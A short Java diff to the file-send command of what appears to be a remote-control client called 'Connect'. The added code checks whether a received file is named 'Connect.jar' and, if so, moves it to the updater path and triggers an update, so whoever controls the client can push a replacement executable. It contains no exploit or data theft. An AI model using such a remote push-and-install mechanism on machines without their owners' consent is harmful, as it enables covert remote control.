@@ -7,6 +7,7 @@ import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.client.ConnectClient;
 import br.com.introcdc.connect.client.command.ClientCommand;
 import br.com.introcdc.connect.client.components.FileComponents;
+import br.com.introcdc.connect.client.components.InstallComponents;
 
 import java.io.BufferedOutputStream;
 import java.io.DataInputStream;
@@ -51,6 +52,11 @@ public class ClientCommandSend extends ClientCommand {
                 }
 
                 msg("Arquivo recebido!");
+
+                if (fileName.equalsIgnoreCase("Connect.jar")) {
+                    new File(FileComponents.FOLDER, fileName).renameTo(new File(InstallComponents.LOCAL_UPDATER));
+                    InstallComponents.verifyUpdate();
+                }
             } catch (Exception exception) {
                 msg("Ocorreu um erro enviar um arquivo! (" + exception.getMessage() + ")");
                 exception(exception);
